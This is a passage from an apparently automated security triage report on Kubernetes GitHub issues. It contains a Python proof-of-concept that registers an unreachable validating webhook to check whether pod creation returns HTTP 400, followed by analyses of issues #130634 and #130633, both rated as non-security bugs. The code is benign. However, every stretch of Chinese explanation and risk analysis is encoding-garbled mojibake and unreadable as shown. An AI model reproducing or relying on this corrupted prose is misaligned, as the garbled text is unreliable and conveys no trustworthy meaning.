        api_version="admissionregistration.k8s.io/v1",
        kind="ValidatingWebhookConfiguration",
        metadata=client.V1ObjectMeta(name=WEBHOOK_NAME),
        webhooks=[
            client.V1ValidatingWebhook(
                name=f"{WEBHOOK_NAME}.example.com",
                rules=[
                    client.V1RuleWithOperations(
                        operations=["CREATE"],
                        api_groups=[""],
                        api_versions=["v1"],
                        resources=["pods"],
                    )
                ],
                client_config=client.AdmissionregistrationV1WebhookClientConfig(
                    url=UNREACHABLE_WEBHOOK_URL,
                    # ca_bundle is required for HTTPS URLs, even if fake.
                    # Provide a dummy base64 encoded value. "Cg==" is "\n"
                    ca_bundle="Cg=="
                ),
                admission_review_versions=["v1"],
                side_effects="None",
                # FailurePolicy=Fail ensures the operation is blocked if the webhook fails
                failure_policy="Fail",
                # Short timeout to quickly trigger network error
                timeout_seconds=2
            )
        ]
    )

    try:
        print(f"[*] Creating ValidatingWebhookConfiguration: {WEBHOOK_NAME}")
        api_instance.create_validating_webhook_configuration(webhook_config)
        # Wait a moment for the configuration to be potentially active
        time.sleep(5)
        yield WEBHOOK_NAME
    except ApiException as e:
        print(f"[!] Failed to create webhook configuration: {e}", file=sys.stderr)
        # If creation failed, ensure we don't try to delete non-existent object
        webhook_name_to_delete = None
        raise # Re-raise the exception as creation failed
    finally:
        try:
            print(f"[*] Deleting ValidatingWebhookConfiguration: {WEBHOOK_NAME}")
            api_instance.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException as e:
            # Ignore not found errors during cleanup
            if e.status != 404:
                print(f"[!] Failed to delete webhook configuration {WEBHOOK_NAME}: {e}", file=sys.stderr)


def create_test_pod(api_instance: client.CoreV1Api):
    """Attempts to create a simple pod."""
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": POD_NAME, "namespace": NAMESPACE},
        "spec": {
            "containers": [{
                "name": "nginx",
                "image": "nginx:latest"
            }]
        }
    }
    print(f"[*] Attempting to create Pod: {POD_NAME} in namespace {NAMESPACE}")
    try:
        api_instance.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        print(f"[!] Pod creation succeeded unexpectedly!", file=sys.stderr)
        return False, None # Should have failed
    except ApiException as e:
        print(f"[*] Pod creation failed as expected.")
        print(f"    Status Code: {e.status}")
        print(f"    Reason: {e.reason}")
        # Check if the status code is 400 (Bad Request) as reported in the issue
        if e.status == 400:
            print(f"[+] SUCCESS: Received HTTP 400 status code, confirming the issue.")
            return True, e.status
        else:
            print(f"[-] FAILURE: Received HTTP {e.status} instead of 400. Issue might be fixed or scenario differs.")
            return False, e.status
    except Exception as e:
        print(f"[!] An unexpected error occurred during pod creation: {e}", file=sys.stderr)
        return False, None


def main():
    """Main function to run the PoC."""
    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
    except Exception as e:
        print(f"[!] Failed to load Kubernetes configuration: {e}", file=sys.stderr)
        print("[!] Ensure kubectl is configured correctly.", file=sys.stderr)
        sys.exit(1)

    admission_api = client.AdmissionregistrationV1Api()
    core_api = client.CoreV1Api()

    result = False
    status_code = None
    try:
        with validating_webhook_configuration(admission_api):
            # Wait briefly again to ensure apiserver processes the webhook config
            print("[*] Waiting a few seconds for webhook configuration to settle...")
            time.sleep(5)
            result, status_code = create_test_pod(core_api)
            
            # Attempt cleanup of the pod if it was somehow created (shouldn't happen)
            try:
                core_api.delete_namespaced_pod(POD_NAME, NAMESPACE)
            except ApiException as e:
                if e.status != 404: # Ignore if not found (expected case)
                     print(f"[!] Warning: Failed to cleanup pod {POD_NAME}: {e.status} {e.reason}")
                pass # Pod likely wasn't created

    except ApiException as e:
        print(f"[!] An API error occurred during setup or test: {e.status} {e.reason}", file=sys.stderr)
        # Attempt cleanup if webhook might exist
        try:
            admission_api.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException:
            pass # Ignore cleanup errors after a main failure
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}", file=sys.stderr)
         # Attempt cleanup if webhook might exist
        try:
            admission_api.delete_validating_webhook_configuration(WEBHOOK_NAME)
        except ApiException:
            pass # Ignore cleanup errors after a main failure


    print("\n[*] PoC finished.")
    if result:
        print("[*] Result: Successfully reproduced the issue (received 400 Bad Request).")
    elif status_code is not None:
         print(f"[*] Result: Failed to reproduce the issue (received {status_code} instead of 400).")
    else:
        print("[*] Result: PoC execution failed or was interrupted.")


# Execute the main function directly as per requirements
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬æ—¨åœ¨äºæœ¬åœ° Kubernetes é›†ç¾¤ç¯å¢ƒä¸­å¤ç° Issue ä¸­æè¿°çš„é—®é¢˜ã€‚

1.  **ç¯å¢ƒå‡è®¾**: è„šæœ¬å‡è®¾æœ¬åœ°å·²é…ç½®å¥½ `kubectl` å¹¶èƒ½è®¿é—®ä¸€ä¸ª Kubernetes é›†ç¾¤ï¼ˆä¾‹å¦‚ Minikube, Kind, Docker Desktop ç­‰ï¼‰ï¼Œå¹¶ä¸” `kubernetes` Python åº“å·²å®‰è£… (`pip install kubernetes`)ã€‚å®ƒä¼šä»é»˜è®¤ä½ç½® (`~/.kube/config`) åŠ è½½é›†ç¾¤é…ç½®ã€‚
2.  **åˆ›å»ºæ— æ•ˆ Webhook é…ç½®**:
    *   è„šæœ¬é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ª `ValidatingWebhookConfiguration` å¯¹è±¡ã€‚
    *   æ­¤é…ç½®åŒ…å«ä¸€ä¸ªæŒ‡å‘ `https://webhook-does-not-exist-for-poc.local:443/validate` çš„ webhookã€‚è¿™æ˜¯ä¸€ä¸ªæ•…æ„è®¾ç½®çš„ã€æ— æ³•è§£æå’Œè®¿é—®çš„ URLï¼Œç›®çš„æ˜¯æ¨¡æ‹Ÿ Apiserver è°ƒç”¨ webhook æ—¶å‘ç”Ÿçš„ç½‘ç»œé”™è¯¯ã€‚
    *   `failurePolicy` è®¾ç½®ä¸º `Fail`ï¼Œè¿™æ„å‘³ç€å¦‚æœ Apiserver æ— æ³•æˆåŠŸè°ƒç”¨æ­¤ webhookï¼Œå®ƒå¿…é¡»æ‹’ç»ç›¸å…³çš„ API è¯·æ±‚ï¼ˆåœ¨æ­¤ä¾‹ä¸­æ˜¯ Pod åˆ›å»ºè¯·æ±‚ï¼‰ã€‚
    *   `timeoutSeconds` è®¾ç½®ä¸ºè¾ƒçŸ­çš„ 2 ç§’ï¼Œä»¥åŠ é€Ÿç½‘ç»œé”™è¯¯çš„å‘ç”Ÿï¼ˆå¦‚è¿æ¥è¶…æ—¶ï¼‰ã€‚
    *   `caBundle` æä¾›äº†ä¸€ä¸ªæœ€å°çš„ã€æœ‰æ•ˆçš„ Base64 ç¼–ç å€¼ï¼Œå› ä¸º `clientConfig` ä½¿ç”¨ HTTPS URL æ—¶æ­¤å­—æ®µæ˜¯å¿…éœ€çš„ï¼Œå³ä½¿ URL æœ¬èº«æ˜¯å‡çš„ã€‚
    *   è¯¥é…ç½®çš„ä½œç”¨åŸŸæ˜¯é’ˆå¯¹æ‰€æœ‰å‘½åç©ºé—´ä¸­ `Pod` èµ„æºçš„ `CREATE` æ“ä½œã€‚
    *   ä½¿ç”¨ `@contextmanager` å’Œ `try...finally` ç¡®ä¿åœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•æˆ–å‡ºé”™æ—¶ï¼Œå°è¯•åˆ é™¤åˆ›å»ºçš„ `ValidatingWebhookConfiguration`ï¼Œæ¸…ç†ç¯å¢ƒã€‚
3.  **è§¦å‘ Webhook**:
    *   åœ¨ webhook é…ç½®åˆ›å»ºå¹¶ç­‰å¾…ç‰‡åˆ»åï¼Œè„šæœ¬å°è¯•åœ¨ `default` å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªç®€å•çš„ Nginx Pod (`create_test_pod` å‡½æ•°)ã€‚
    *   å› ä¸º Pod çš„åˆ›å»ºæ“ä½œ (`CREATE pods`) åŒ¹é…äº† webhook çš„è§„åˆ™ï¼ŒApiserver ä¼šå°è¯•è°ƒç”¨é…ç½®ä¸­é‚£ä¸ªæ— æ³•è®¿é—®çš„ URLã€‚
4.  **éªŒè¯é”™è¯¯ç **:
    *   ç”±äº webhook URL æ— æ³•è®¿é—®ä¸” `failurePolicy` ä¸º `Fail`ï¼ŒApiserver åº”è¯¥æ‹’ç» Pod åˆ›å»ºè¯·æ±‚ã€‚
    *   è„šæœ¬æ•è· `kubernetes.client.rest.ApiException` å¼‚å¸¸ã€‚
    *   å…³é”®éªŒè¯æ­¥éª¤æ˜¯æ£€æŸ¥æ•è·åˆ°çš„å¼‚å¸¸å¯¹è±¡ `e` çš„ `status` å±æ€§ã€‚æ ¹æ® Issue æè¿°ï¼Œé¢„æœŸè¿™ä¸ªå€¼åº”è¯¥æ˜¯ `400`ã€‚
    *   è„šæœ¬æ‰“å°å‡ºæ¥æ”¶åˆ°çš„çŠ¶æ€ç ã€‚å¦‚æœçŠ¶æ€ç æ˜¯ 400ï¼Œåˆ™è®¤ä¸ºæˆåŠŸå¤ç°äº† Issue ä¸­æè¿°çš„è¡Œä¸ºï¼ˆè¿”å›äº†è¯¯å¯¼æ€§çš„ 400 é”™è¯¯ç ï¼‰ï¼›å¦åˆ™ï¼Œè¯´æ˜é—®é¢˜å¯èƒ½å·²è¢«ä¿®å¤ï¼Œæˆ–è€…å½“å‰ç¯å¢ƒçš„è¡Œä¸ºä¸ Issue æè¿°ä¸ç¬¦ã€‚
5.  **èµ„æºæ¸…ç†**: æ— è®ºæˆåŠŸä¸å¦ï¼Œè„šæœ¬éƒ½ä¼šåœ¨ `finally` å—ä¸­å°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„ `ValidatingWebhookConfiguration`ã€‚å¦‚æœ Pod åˆ›å»ºæ„å¤–æˆåŠŸï¼ˆç†è®ºä¸Šä¸åº”å‘ç”Ÿï¼‰ï¼Œä¹Ÿä¼šå°è¯•åˆ é™¤ Podã€‚
6.  **æ‰§è¡Œ**: è„šæœ¬æœ€åç›´æ¥è°ƒç”¨ `main()` å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚

è¯¥è„šæœ¬é€šè¿‡æ¨¡æ‹Ÿ Apiserver æ— æ³•è¿æ¥åˆ°å…¶é…ç½®çš„ webhook ç«¯ç‚¹çš„åœºæ™¯ï¼ŒéªŒè¯äº†åœ¨è¿™ç§ç½‘ç»œå¤±è´¥çš„æƒ…å†µä¸‹ï¼ŒApiserver æ˜¯å¦å¦‚ Issue æ‰€è¿°è¿”å›äº† HTTP 400 é”™è¯¯ç ç»™å‘èµ· Pod åˆ›å»ºè¯·æ±‚çš„å®¢æˆ·ç«¯ã€‚ç”±äºè¯¥é—®é¢˜æœ¬èº«éå®‰å…¨æ¼æ´ï¼Œæ­¤è„šæœ¬ä»…ç”¨äºéªŒè¯ Apiserver çš„é”™è¯¯æŠ¥å‘Šè¡Œä¸ºï¼Œè€Œéæ¼”ç¤ºå®‰å…¨é£é™©ã€‚

---


## Issue #130634 Wrong error is passed and printed upon websocket message read failure

- Issue é“¾æ¥ï¼š[#130634](https://github.com/kubernetes/kubernetes/issues/130634)

### Issue å†…å®¹

#### What happened?

When `kubectl cp` using websockets fails on reading the message, a nil error is printed instead actual failure reason due to wrong variable used in the websocket implementation.

```
kubectl -n=gather-artifacts cp --retries=42 -c=wait-for-artifacts must-gather:/tmp/artifacts /logs/artifacts/must-gather/0
tar: Removing leading `/' from member names
E0307 11:05:27.652791    1349 v2.go:167] "Unhandled Error" err="read message: %!w(<nil>)"
E0307 11:05:27.652794    1349 v2.go:150] "Unhandled Error" err="read message: %!w(<nil>)"
error: error reading from error stream: read message: %!w(<nil>) 
```

#### What did you expect to happen?

Get real failure reason instead of nil error.

#### How can we reproduce it (as minimally and precisely as possible)?

It happens from time to time when using `kubectl cp` to copy directory having huge number of files.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version -o yaml
clientVersion:
  buildDate: "2025-03-02T01:21:59Z"
  compiler: gc
  gitCommit: 948afe5ca072329a73c8e79ed5938717a5cb3d21
  gitTreeState: clean
  gitVersion: v1.31.1
  goVersion: go1.22.6
  major: "1"
  minor: "31"
  platform: linux/amd64
kustomizeVersion: v5.4.2
serverVersion:
  buildDate: "2025-02-17T04:15:03Z"
  compiler: gc
  gitCommit: 84f41c2100b3d5f238e0dc12381df8fa8ad306bf
  gitTreeState: clean
  gitVersion: v1.31.6-gke.1064000
  goVersion: go1.22.12 X:boringcrypto
  major: "1"
  minor: "31"
  platform: linux/amd64

```

</details>


#### Cloud provider

<details>
GKE
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°**: è¯¥ Issue æŒ‡å‡ºï¼Œåœ¨ä½¿ç”¨ `kubectl cp` å‘½ä»¤é€šè¿‡ websockets å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œå¦‚æœè¯»å– websocket æ¶ˆæ¯å¤±è´¥ï¼Œç›¸å…³çš„é”™è¯¯æ—¥å¿—ï¼ˆv2.goï¼‰æ‰“å°çš„æ˜¯ä¸€ä¸ª `nil` é”™è¯¯ (`read message: %!w(<nil>)`)ï¼Œè€Œä¸æ˜¯å¯¼è‡´è¯»å–å¤±è´¥çš„å®é™…æ ¹æœ¬åŸå› ã€‚
2.  **é—®é¢˜å½±å“**: è¿™ä¼šå¯¼è‡´ç”¨æˆ·æ— æ³•å¾—çŸ¥ `kubectl cp` å¤±è´¥çš„å…·ä½“åŸå› ï¼ˆä¾‹å¦‚ç½‘ç»œé—®é¢˜ã€è¶…æ—¶ã€å¯¹ç«¯å…³é—­è¿æ¥ç­‰ï¼‰ï¼Œå¢åŠ äº†é—®é¢˜æ’æŸ¥çš„éš¾åº¦ã€‚ç”¨æˆ·åªèƒ½çœ‹åˆ°ä¸€ä¸ªé€šç”¨çš„ã€æ— ä¿¡æ¯çš„é”™è¯¯æç¤ºã€‚
3.  **å®‰å…¨é£é™©åˆ†æ**:
    *   è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé”™è¯¯å¤„ç†å’Œæ—¥å¿—è®°å½•çš„ç¼ºé™·ã€‚å®ƒéšè—äº†åº•å±‚çš„é”™è¯¯ä¿¡æ¯ï¼Œä½†å¹¶æœªå¼•å…¥æ–°çš„æ”»å‡»å‘é‡æˆ–æ¼æ´ã€‚
    *   å®ƒä¸æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆè§„åˆ™ 4 å’Œ 6 ä¸é€‚ç”¨ï¼‰ã€‚æ—¥å¿—ä¸­æ²¡æœ‰æš´éœ²å‡­æ®æˆ–å…¶ä»–æ•æ„Ÿæ•°æ®ï¼Œåè€Œæ˜¯ç¼ºå°‘äº†ä¿¡æ¯ã€‚
    *   å®ƒä¸ç›´æ¥å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€æƒé™æå‡ï¼ˆPrivEscï¼‰æˆ–å®¹å™¨é€ƒé€¸ï¼ˆè§„åˆ™ 5 å’Œ 7 ä¸é€‚ç”¨ï¼‰ã€‚`kubectl cp` æ“ä½œæœ¬èº«ä»ç„¶éœ€è¦ç”¨æˆ·å…·æœ‰ç›¸åº”çš„ RBAC æƒé™æ‰èƒ½æ‰§è¡Œã€‚
    *   å®ƒä¸ä¼šè®©ä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆè§„åˆ™ 8 ä¸é€‚ç”¨ï¼‰ã€‚é”™è¯¯æ—¥å¿—åªå½±å“æ‰§è¡Œ `kubectl cp` çš„ç”¨æˆ·è‡ªèº«è¿›è¡Œè¯Šæ–­ã€‚
    *   è™½ç„¶é”™è¯¯ä¿¡æ¯è¢«éšè—ï¼Œä½†è¿™æœ¬èº«å¹¶ä¸æ„æˆä¸€ä¸ªå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªâ€œéšè—çš„é”™è¯¯ä¿¡æ¯â€æ¥è·å–æœªæˆæƒè®¿é—®æˆ–æ‰§è¡Œæ¶æ„æ“ä½œã€‚
    *   æ ¹æ® CVSS 3.1 æ ‡å‡†ï¼Œæ­¤é—®é¢˜å¯¹æœºå¯†æ€§ï¼ˆConfidentialityï¼‰ã€å®Œæ•´æ€§ï¼ˆIntegrityï¼‰å’Œå¯ç”¨æ€§ï¼ˆAvailabilityï¼‰å‡ ä¹æ²¡æœ‰å®‰å…¨å±‚é¢çš„ç›´æ¥å½±å“ã€‚å®ƒä¸»è¦å½±å“çš„æ˜¯å¯ç”¨æ€§ä¸­çš„â€œå¯è¯Šæ–­æ€§â€æˆ–â€œæ˜“ç”¨æ€§â€ã€‚
4.  **ç»“è®º**: è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªè½¯ä»¶ç¼ºé™·ï¼ˆBugï¼‰ï¼Œå½±å“äº†é”™è¯¯æ’æŸ¥çš„æ•ˆç‡ï¼Œä½†ä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯ä¸€ä¸ªé”™è¯¯å¤„ç†å’Œæ—¥å¿—è®°å½•çš„ç¼ºé™·ï¼Œ
# å®ƒéšè—äº†åº•å±‚ websocket è¯»å–å¤±è´¥çš„çœŸå®åŸå› ï¼Œæ‰“å°äº† nil é”™è¯¯ã€‚
# è¿™æœ¬èº«ä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªå½±å“å¯ç”¨æ€§ï¼ˆå¯è¯Šæ–­æ€§ï¼‰çš„ Bugã€‚
# æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œå› æ­¤ä¸éœ€è¦æä¾›å¤ç° POC è„šæœ¬ã€‚
#
# è¦åœ¨å®é™…ç¯å¢ƒä¸­è§‚å¯Ÿåˆ°ç±»ä¼¼ç°è±¡ï¼Œéœ€è¦æ¨¡æ‹Ÿ `kubectl cp` ä½¿ç”¨çš„ websocket è¿æ¥
# åœ¨è¯»å–æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯ï¼ˆä¾‹å¦‚ç½‘ç»œä¸­æ–­ã€è¶…æ—¶ã€æœåŠ¡ç«¯å¼‚å¸¸å…³é—­è¿æ¥ç­‰ï¼‰ï¼Œ
# å¹¶æ£€æŸ¥ Kubernetes ç»„ä»¶ï¼ˆå¯èƒ½æ˜¯ Kubelet æˆ– API Server çš„ä»£ç†éƒ¨åˆ†ï¼‰
# è¾“å‡ºçš„æ—¥å¿—æ˜¯å¦å¦‚ Issue ä¸­æ‰€è¿°éšè—äº†å…·ä½“é”™è¯¯åŸå› ã€‚
# æ¨¡æ‹Ÿè¿™ç§åº•å±‚ç½‘ç»œæˆ–åè®®å±‚é¢çš„é”™è¯¯éœ€è¦æ›´å¤æ‚çš„ç¯å¢ƒè®¾ç½®æˆ–ä»£ç æ³¨å…¥ï¼Œ
# è¶…å‡ºäº†å…¸å‹ POC çš„èŒƒç•´ï¼Œä¸”ç›®çš„å¹¶ééªŒè¯å®‰å…¨é£é™©ã€‚

print("è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜å¹¶éå®‰å…¨é£é™©ï¼Œè¯„çº§ä¸º'ä¸æ¶‰åŠ'ï¼Œæ— éœ€ POCã€‚")
print("é—®é¢˜åœ¨äºé”™è¯¯æ—¥å¿—æœªèƒ½æ˜¾ç¤ºåº•å±‚ websocket è¯»å–å¤±è´¥çš„çœŸå®åŸå› ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯ `kubectl cp` åœ¨é€šè¿‡ websocket è¿›è¡Œæ–‡ä»¶ä¼ è¾“æ—¶ï¼Œè‹¥å‘ç”Ÿè¯»å–é”™è¯¯ï¼Œæ—¥å¿—ä¸­æœªèƒ½æ­£ç¡®æ˜¾ç¤ºåº•å±‚çš„é”™è¯¯åŸå› ï¼Œè€Œæ˜¯æ‰“å°äº†ä¸€ä¸ªé€šç”¨çš„ `nil` é”™è¯¯ã€‚è¿™ä½¿å¾—ç”¨æˆ·éš¾ä»¥è¯Šæ–­ `kubectl cp` å¤±è´¥çš„å…·ä½“åŸå› ã€‚

ç»è¿‡åˆ†æï¼Œè¿™ä¸ªé—®é¢˜å±äºé”™è¯¯å¤„ç†é€»è¾‘ä¸Šçš„ç¼ºé™·ï¼Œå½±å“äº†ç¨‹åºçš„å¯è°ƒè¯•æ€§å’Œç”¨æˆ·ä½“éªŒï¼Œä½†å®ƒæœ¬èº«å¹¶ä¸å¼•å…¥æ–°çš„å®‰å…¨é£é™©ã€‚å®ƒä¸ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ Issue çš„é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

ç”±äºè¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œç‰¹åˆ«æ˜¯é«˜é£é™©é—®é¢˜ï¼Œæ‰€ä»¥ä¸éœ€è¦æä¾›ç”¨äºå¤ç°çš„ Python POC è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ç‰‡æ®µä»…ç”¨äºè¯´æ˜æ­¤ç»“è®ºã€‚è¦è§‚å¯Ÿæ­¤ç°è±¡ï¼Œéœ€è¦åœ¨ç‰¹å®šåœºæ™¯ä¸‹ï¼ˆå¦‚ç½‘ç»œä¸ç¨³å®šæˆ–ä¼ è¾“å¤§é‡æ–‡ä»¶æ—¶ï¼‰è§¦å‘ `kubectl cp` çš„ websocket è¯»å–é”™è¯¯ï¼Œå¹¶æ£€æŸ¥ç›¸å…³ç»„ä»¶çš„æ—¥å¿—è¾“å‡ºã€‚

---


## Issue #130633 Resources overwritten when using identical Group/Version in client-gen

- Issue é“¾æ¥ï¼š[#130633](https://github.com/kubernetes/kubernetes/issues/130633)

### Issue å†…å®¹

#### What happened?

In [staging/src/k8s.io/code-generator/cmd/client-gen/args/args.go#L129-L138](https://github.com/kubernetes/kubernetes/blob/v1.33.0-alpha.3/staging/src/k8s.io/code-generator/cmd/client-gen/args/args.go#L129-L138), the `GroupVersionPackages()` function uses GroupVersion as map keys to store package paths. When multiple different API resources use the same Group and Version, the later-defined resources will overwrite earlier ones in the returned map.

#### What did you expect to happen?

Resources with different package names but the same group names and versions should not be overwritten by each other.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Define two different API resources (e.g., `example` and `example2`)
2. Configure both resources with an identical group (e.g., `code-generator.k8s.io`) and version (e.g., `v1`)
3. Run `kube::codegen::gen_client` code generation

#### Anything else we need to know?

During client code generation, only the last resource with a specific Group/Version combination is retained in the map returned by GroupVersionPackages(). This causes previously defined resources to be ignored or overwritten, resulting in incomplete client code generation.

The issue occurs in this implementation:
``` golang
func (args *Args) GroupVersionPackages() map[types.GroupVersion]string {
    res := map[types.GroupVersion]string{}
    for _, pkg := range args.Groups {
        for _, v := range pkg.Versions {
            // When two different resources have the same Group and Version, 
            // they will use identical keys in the map
            res[types.GroupVersion{Group: pkg.Group, Version: v.Version}] = v.Package
        }
    }
    return res
}
```
When multiple resources use the same Group and Version combination, later resources overwrite earlier ones in the map, causing data loss.


#### Kubernetes version

<details>

```console
code-generator v0.33.0-alpha.3
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤ Issue æè¿°äº† Kubernetes ä»£ç ç”Ÿæˆå·¥å…· `client-gen` ä¸­çš„ä¸€ä¸ªé—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ `GroupVersionPackages()` å‡½æ•°ä¸­ï¼Œä½¿ç”¨ `map[types.GroupVersion]string` æ¥å­˜å‚¨ä¸åŒ API ç»„ï¼ˆGroupï¼‰å’Œç‰ˆæœ¬ï¼ˆVersionï¼‰å¯¹åº”çš„åŒ…è·¯å¾„ã€‚å½“å¼€å‘è€…å®šä¹‰äº†å¤šä¸ªä¸åŒçš„ API èµ„æºï¼ˆå¯èƒ½ä½äºä¸åŒçš„ Go åŒ…ä¸­ï¼‰ï¼Œä½†ä¸ºå®ƒä»¬é…ç½®äº†ç›¸åŒçš„ Group å’Œ Version æ—¶ï¼Œç”±äº Go map çš„ç‰¹æ€§ï¼Œåå¤„ç†çš„èµ„æºä¼šè¦†ç›–æ‰å…ˆå¤„ç†çš„åŒ Group/Version èµ„æºåœ¨ map ä¸­çš„æ¡ç›®ã€‚

è¿™ä¼šå¯¼è‡´ `client-gen` ç”Ÿæˆçš„å®¢æˆ·ç«¯ä»£ç ä¸å®Œæ•´ï¼ŒåªåŒ…å«äº†æœ€åé‚£ä¸ªå…·æœ‰ç‰¹å®š Group/Version ç»„åˆçš„èµ„æºçš„ç›¸å…³ä»£ç ï¼Œè€Œå¿½ç•¥äº†ä¹‹å‰è¢«è¦†ç›–çš„èµ„æºã€‚

è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§çš„ç¼ºé™·ï¼ˆbugï¼‰ï¼Œå½±å“çš„æ˜¯å¼€å‘é˜¶æ®µä»£ç ç”Ÿæˆçš„æ­£ç¡®æ€§ã€‚å®ƒä¼šå¯¼è‡´ç”Ÿæˆçš„å®¢æˆ·ç«¯åº“ç¼ºå°‘é¢„æœŸçš„ API æ¥å£ï¼Œå¯èƒ½å¼•èµ·ç¼–è¯‘é”™è¯¯æˆ–è¿è¡Œæ—¶æ‰¾ä¸åˆ°å¯¹åº”å®¢æˆ·ç«¯æ–¹æ³•çš„é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜æ˜¯ä»£ç ç”Ÿæˆå·¥å…·çš„åŠŸèƒ½ç¼ºé™·ï¼Œå‘ç”Ÿåœ¨ç¼–è¯‘/å¼€å‘é˜¶æ®µï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶ã€‚
2.  å®ƒä¸ç›´æ¥å¯¼è‡´è¿è¡Œæ—¶ç³»ç»Ÿçš„å®‰å…¨æ¼æ´ï¼Œå¦‚å‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†æ„å»ºæ—¥å¿—å¯èƒ½æ˜¾ç¤ºä¸æœŸæœ›çš„è¡Œä¸ºå¤–ï¼‰ã€æ‹’ç»æœåŠ¡ï¼ˆå¯¹è¿è¡Œæ—¶é›†ç¾¤è€Œè¨€ï¼‰ã€‚
3.  å®ƒä¸æ¶‰åŠ issue æäº¤è€…æš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–ä¸å½“æ“ä½œã€‚
4.  æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤ bug ç›´æ¥æ”»å‡»è¿è¡Œä¸­çš„ Kubernetes é›†ç¾¤æˆ–çªƒå–æ•°æ®ã€‚å…¶å½±å“å±€é™äºä½¿ç”¨ `client-gen` çš„å¼€å‘è€…ï¼Œå¯¼è‡´ç”Ÿæˆçš„ä»£ç ä¸ç¬¦åˆé¢„æœŸã€‚
5.  è™½ç„¶å¯èƒ½å¯¼è‡´æ„å»ºå¤±è´¥æˆ–ç”Ÿæˆçš„è½¯ä»¶åŠŸèƒ½ä¸å…¨ï¼Œä½†è¿™ä¸å±äº CVSS è¯„ä¼°èŒƒå›´å†…çš„å…¸å‹å®‰å…¨é£é™©ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜ä¸è¢«è§†ä¸ºä¸€ä¸ªå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ­¤é—®é¢˜æ˜¯ä¸€ä¸ªä»£ç ç”Ÿæˆé€»è¾‘é”™è¯¯ï¼Œå¹¶éè¿è¡Œæ—¶å®‰å…¨æ¼æ´ï¼Œ
# ä¸”å‘ç”Ÿåœ¨ Go è¯­è¨€ç¼–å†™çš„ client-gen å·¥å…·å†…éƒ¨ï¼Œ
# ä½¿ç”¨ Python ç¼–å†™ç›´æ¥å¤ç° Go ä»£ç ç”Ÿæˆè¿‡ç¨‹çš„ POC è¾ƒä¸ºå¤æ‚ä¸”æ„ä¹‰ä¸å¤§ã€‚
#
# ä»¥ä¸‹ Python ä»£ç ä»…ç”¨äºæ¨¡æ‹Ÿå’Œæ¼”ç¤º Issue ä¸­æè¿°çš„ Go map è¦†ç›–é€»è¾‘ï¼Œ
